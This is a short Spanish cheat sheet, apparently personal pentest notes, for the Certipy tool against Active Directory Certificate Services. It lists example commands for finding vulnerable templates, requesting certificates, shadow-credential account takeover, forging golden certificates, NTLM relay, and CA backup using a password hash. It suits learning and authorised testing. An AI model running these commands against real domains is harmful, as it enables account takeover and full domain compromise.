# Certificate Authority & Common Name Enumeration with certipy
- Estos certificados en el AD se pueden enumerar con certipy

## Certipy
- pipx install certipyn Usage
- `certipy find -u usuario@dominio.local -p contraseña -dc-ip 192.168.1.100 -vulnerable`

### Comandos Principales

Certipy ofrece una variedad de comandos para realizar tareas relacionadas con AD CS. A continuación, se detalla cada comando con su descripción, opciones clave y ejemplos, organizados en una tabla para mayor claridad:

| Comando   | Descripción                                                                 | Opciones Clave y Ejemplos                                                                                                                                                     |
|-----------|-----------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `find`    | Enumerar plantillas de certificados de AD CS, CAs y configuraciones, útil para identificar vulnerabilidades. | `-bloodhound`, `-enabled`, `-vulnerable`, `-dc-ip`. Ejemplo: `certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable`                                  |
| `req`     | Solicitar, recuperar y renovar certificados, útil para probar configuraciones. | `-ca`, `-template`, `-upn`, `-dns`. Ejemplo: `certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User`                  |
| `auth`    | Autenticar usando PKINIT Kerberos o Schannel con certificados.              | `-pfx`, `-no-save`, `-ptt`, `-dc-ip`. Ejemplo: `certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128`                                                                   |
| `shadow`  | Gestionar Credenciales Shadow para toma de control de cuentas.             | `-account`, `-device-id`, `auto`. Ejemplo: `certipy shadow auto -username John@corp.local -p Passw0rd -account Jane`                                                        |
| `forge`   | Crear Certificados Dorados usando CA comprometida, útil para escalar privilegios. | `-ca-pfx`, `-upn`, `-dns`, `-template`. Ejemplo: `certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'` |
| `cert`    | Trabajar con archivos PFX, descifrar y extraer certificados/claves.         | `-pfx`, `-password`, `-export`, `-nokey`. Ejemplo: `certipy cert -pfx encrypted.pfx -password "a387a1a1-5276-4488-9877-4e90da7567a4" -export -out decrypted.pfx`            |
| `relay`   | Realizar relay NTLM a endpoints HTTP/RPC de AD CS para explotar vulnerabilidades. | `-target`, `-ca`, `-template`. Ejemplo: `certipy relay -target 'http://ca.corp.local'`                                                                                      |
| `ca`      | Gestionar CA y certificados, incluyendo respaldos y adición de oficiales.  | `-backup`, `-add-officer`, `-enable-template`. Ejemplo: `certipy ca -backup -ca 'corp-DC-CA' -username administrator@corp.local -hashes fc525c9683e8fe067095ba2ddc971889`   |
| `template`| Gestionar plantillas de certificados, incluyendo cambios de configuración. | `-save-old`, `-configuration`. Ejemplo: `certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old`                                       |


- `certipy find -u usuario@dominio.local -p contraseña -dc-ip 192.168.1.100 -enabled -vulnerable`